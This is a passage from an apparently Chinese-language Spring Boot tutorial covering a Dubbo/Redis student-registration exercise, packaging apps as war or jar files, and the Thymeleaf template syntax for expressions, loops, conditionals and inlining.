class="string">zookeeper://localhost:2181</span></span><br></pre></td></tr></table></figure><h2 id="7-5-练习"><a href="#7-5-练习" class="headerlink" title="7.5 练习"></a>7.5 练习</h2><p>使用的技术： SpringBoot ,Dubbo, Redis, MyBatis</p><p>CREATE TABLE <code>student</code> (<br>  <code>id</code> int(11) NOT NULL AUTO_INCREMENT,<br>  <code>name</code> varchar(255) COLLATE utf8_bin DEFAULT NULL,<br>  <code>phone</code> varchar(11) COLLATE utf8_bin DEFAULT NULL,<br>  <code>age</code> int(11) DEFAULT NULL,<br>  PRIMARY KEY (<code>id</code>)<br>) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;6 DEFAULT CHARSET&#x3D;utf8 COLLATE&#x3D;utf8_bin;</p><ol><li>注册学生</li></ol><p>​     phone必须唯一， 如果已经存在了手机号， 注册失败的。 </p><p>​                 int addStudent(Student student);</p><p>​                返回值：int</p><p>​                 1： 注册成功</p><p>​                 2 ： 手机号已经存在  </p><p>​                                    </p><p>​      name至少两个字符，</p><p>​      age 必须 大于 0 </p><p>2） 查询学生，根据id查询，此学生。 </p><p>​        先到redis查询学生， 如果redis没有此学生，从数据库查询， 把查询到的学生放入到redis。</p><p>​      后面再次查询这个学生应该从redis就能获取到。</p><p>​        Student  queryStudent(Integer id);</p><ol start="3"><li>使用Dubbo框架，    addStudent, queryStudent 是有服务提供者实现的。</li></ol><p>​    消费者可以是一个Controller ， 调用提供者的两个方法。  实现注册和查询。</p><p>4）页面使用html和ajax，jquery。</p><p>​       在html页面中提供 form 注册学生， 提供文本框输入id，进行查询。</p><p>​      注册和查询都使用ajax技术。</p><p>​    html，jquery.js都放到resources&#x2F;static目录中</p><h1 id="第八章-打包"><a href="#第八章-打包" class="headerlink" title="第八章  打包"></a>第八章  打包</h1><h2 id="8-1-打包war"><a href="#8-1-打包war" class="headerlink" title="8.1 打包war"></a>8.1 打包war</h2><p>1.创建了一个jsp应用</p><p>2.修改pom.xml</p><p> 1)指定打包后的文件名称</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--打包后的文件名称--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>myboot<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2)指定jsp编译目录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--resources插件， 把jsp编译到指定的目录--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/webapp<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>META-INF/resources<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--使用了mybatis ，而且mapper文件放在src/main/java目录--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--把src/main/resources下面的所有文件，都包含到classes目录--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3）执行打包是war</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--打包类型--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4）主启动类继承SpringBootServletInitializer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * SpringBootServletInitializer: 继承这个类， 才能使用独立tomcat服务器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JspApplication</span>  <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span>  &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      SpringApplication.run(JspApplication.class, args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">protected</span> SpringApplicationBuilder <span class="title function_">configure</span><span class="params">(SpringApplicationBuilder builder)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> builder.sources(JspApplication.class);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5）部署war</p><p> 把war放到tomcat等服务器的发布目录中。  tomcat为例， myboot.war放到tomcat&#x2F;webapps目录。</p><h2 id="8-2-打包为jar"><a href="#8-2-打包为jar" class="headerlink" title="8.2 打包为jar"></a>8.2 打包为jar</h2><p>1.创建了一个包含了jsp的项目</p><p>2.修改pom.xml</p><p>​     1) 指定打包后的文件名称</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--打包后的文件名称--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>myboot<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>指定springboot-maven-plugin版本</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--打包jar， 有jsp文件时，必须指定maven-plugin插件的版本是 1.4.2.RELEASE--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3）最后执行 maven clean package</p><p>​       在target目录中，生成jar 文件， 例子是myboot.jar</p><p>​       执行独立的springboot项目  在cmd中 java  -jar  myboot.jar</p><h3 id="中文乱码问题："><a href="#中文乱码问题：" class="headerlink" title="中文乱码问题："></a>中文乱码问题：</h3><p>设置JVM编码参数：在运行JAR文件时，通过设置JVM的编码参数来指定正确的字符编码。在命令行中使用-Dfile.encoding参数来设置编码方式，例如：</p><p><code>java -Dfile.encoding=UTF-8 -jar yourjarfile.jar</code></p><p>在这种情况下JVM编码方式会正常，但如果是在window的终端下可能还是乱码，因为 powershell终端有时候默认编码为GB2312、GBK，解决方法为：<br>输入： <code>chcp 65001</code> 可以临时性将控制台的编码指定为UTF-8</p><p>资源文件存放问题：<br>如果采用</p><p><code>url: jdbc:sqlite:src/main/resources/data/db/photo_information.db</code></p><p>在idea中能正常读取，但是打包后这种相对路径将无法使用，因为在jar包中路径不再像上面这样。打包后的jar包相当于一个压缩包，为保证压缩包内容的完整性，只能够读取，无法写入，所以会动态修改的内容例如嵌入式数据库，都需要放在项目外引用，不应该放在resources目录下。</p><p>打包后资源文件的应用同样不能采用相对路径，只能采用文件流来进行读取，因为读取resources下的文件流在Java中是有封装方法的。</p><h1 id="第九章-Thymeleaf-模板引擎"><a href="#第九章-Thymeleaf-模板引擎" class="headerlink" title="第九章 Thymeleaf 模板引擎"></a>第九章 Thymeleaf 模板引擎</h1><p>Thymeleaf： 是使用java开发的模板技术， 在服务器端运行。 把处理后的数据发送给浏览器。</p><p>​         模板是作视图层工作的。  显示数据的。  Thymeleaf是基于Html语言。 Thymleaf语法是应用在</p><p>​        html标签中 。 SpringBoot框架集成Thymealeaf,  使用Thymeleaf代替jsp。</p><p>Thymeleaf 的官方网站：<a href="http://www.thymeleaf.org/">http://www.thymeleaf.org</a><br>Thymeleaf 官方手册：<a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html">https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html</a></p><h2 id="9-1-表达式"><a href="#9-1-表达式" class="headerlink" title="9.1 表达式"></a>9.1 表达式</h2><ol><li><p>标准变量表达式 </p><p>语法：  ${key} </p><p>作用： 获取key对于的文本数据，  key 是request作用域中的key ， 使用request.setAttribute(), model.addAttribute()</p><p>在页面中的 html标签中， 使用 th:text&#x3D;”${key}”</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 400px&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>标准变量表达式:  $&#123;key&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;site&#125;&quot;</span>&gt;</span>key不存在<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>获取SysUser对象 属性值<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;myuser.id&#125;&quot;</span>&gt;</span>id<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;myuser.name&#125;&quot;</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;myuser.sex&#125;&quot;</span>&gt;</span>姓名：m男<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;myuser.age&#125;&quot;</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;myuser.getName()&#125;&quot;</span>&gt;</span>获取姓名使用getXXX<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>选择变量表达式（ 星号变量表达式）</p><p>语法：  *{key}</p><p>作用： 获取这个key对应的数据，   *{key}需要和th:object 这个属性一起使用。</p><p>目的是简单获取对象的属性值。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>使用 *&#123;&#125; 获取SysUser的属性值<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:object</span>=<span class="string">&quot;$&#123;myuser&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;id&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;name&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;sex&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;age&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>使用*&#123;&#125;完成的表示 对象的属性值<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;myuser.name&#125;&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>链接表达式</p><p>语法： @{url}</p><p>作用： 表示链接， 可以</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> , <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;..&quot;</span>&gt;</span> ,<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;...&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure></li></ol><h2 id="9-2-Thymeleaf属性"><a href="#9-2-Thymeleaf属性" class="headerlink" title="9.2  Thymeleaf属性"></a>9.2  Thymeleaf属性</h2><p>属性是放在html元素中的，就是html元素的属性，加入了th前缀。  属性的作用不变。    加入上th， 属性的值由模板引擎处理了。  在属性可以使用变量表达式</p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/loginServlet&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;/loginServlet&quot;</span> <span class="attr">th:method</span>=<span class="string">&quot;$&#123;methodAttr&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-3-each"><a href="#9-3-each" class="headerlink" title="9.3 each"></a>9.3 each</h2><p>each循环， 可以循环List，Array</p><p>语法：</p><p>在一个html标签中，使用th:each</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:each</span>=<span class="string">&quot;集合循环成员,循环的状态变量:$&#123;key&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;集合循环成员&#125;&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">集合循环成员,循环的状态变量:两个名称都是自定义的。 “循环的状态变量”这个名称可以不定义，默认是&quot;集合循环成员Stat&quot;</span><br></pre></td></tr></table></figure><p>each循环Map</p><p>在一个html标签中，使用th:each</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:each</span>=<span class="string">&quot;集合循环成员,循环的状态变量:$&#123;key&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;集合循环成员.key&#125;&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;集合循环成员.value&#125;&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">集合循环成员,循环的状态变量:两个名称都是自定义的。 “循环的状态变量”这个名称可以不定义，默认是&quot;集合循环成员Stat&quot;</span><br><span class="line"></span><br><span class="line">key:map集合中的key</span><br><span class="line">value：map集合key对应的value值</span><br></pre></td></tr></table></figure><h2 id="9-4-th-if"><a href="#9-4-th-if" class="headerlink" title="9.4 th:if"></a>9.4 th:if</h2><p>“th:if”  : 判断语句， 当条件为true， 显示html标签体内， 反之不显示 没有else语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:if</span>=<span class="string">&quot; 10 &gt; 0 &quot;</span>&gt;</span> 显示文本内容 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一个 th:unless  和 th:if相反的行为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:unless</span>=<span class="string">&quot; 10 &lt; 0 &quot;</span>&gt;</span> 当条件为false显示标签体内容 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例子：if</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 400px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span> if 使用<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;sex==&#x27;m&#x27;&#125;&quot;</span>&gt;</span>性别是男<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;isLogin&#125;&quot;</span>&gt;</span>已经登录系统<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;age &gt; 20&#125;&quot;</span>&gt;</span>年龄大于20<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&quot;&quot;空字符是true--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;name&#125;&quot;</span>&gt;</span>name是“”<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--null是false--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;isOld&#125;&quot;</span>&gt;</span> isOld是null<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例子： unless</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 400px&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h3</span>&gt;</span>unless: 判断条件为false，显示标签体内容<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:unless</span>=<span class="string">&quot;$&#123;sex==&#x27;f&#x27;&#125;&quot;</span>&gt;</span>性别是男的<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:unless</span>=<span class="string">&quot;$&#123;isLogin&#125;&quot;</span>&gt;</span>登录系统<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:unless</span>=<span class="string">&quot;$&#123;isOld&#125;&quot;</span>&gt;</span> isOld是null <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-5-th-switch"><a href="#9-5-th-switch" class="headerlink" title="9.5  th:switch"></a>9.5  th:switch</h2><p>th:switch 和 java中的swith一样的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:switch</span>=<span class="string">&quot;要比对的值&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:case</span>=<span class="string">&quot;值1&quot;</span>&gt;</span></span><br><span class="line">        结果1</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:case</span>=<span class="string">&quot;值2&quot;</span>&gt;</span></span><br><span class="line">        结果2</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:case</span>=<span class="string">&quot;*&quot;</span>&gt;</span></span><br><span class="line">        默认结果</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    以上的case只有一个语句执行</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-6-th-inline"><a href="#9-6-th-inline" class="headerlink" title="9.6 th:inline"></a>9.6 th:inline</h2><ol><li><p>内联text：  在html标签外，获取表达式的值</p><p>语法： </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>显示姓名是：[[$&#123;key&#125;]]<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 400px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>内联 text, 使用内联表达式显示变量的值<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:inline</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是[[$&#123;name&#125;]]，年龄是[[$&#123;age&#125;]]<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            我是<span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;name&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>,年龄是<span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;age&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>使用内联text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是[[$&#123;name&#125;]],性别是[[$&#123;sex&#125;]]<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span 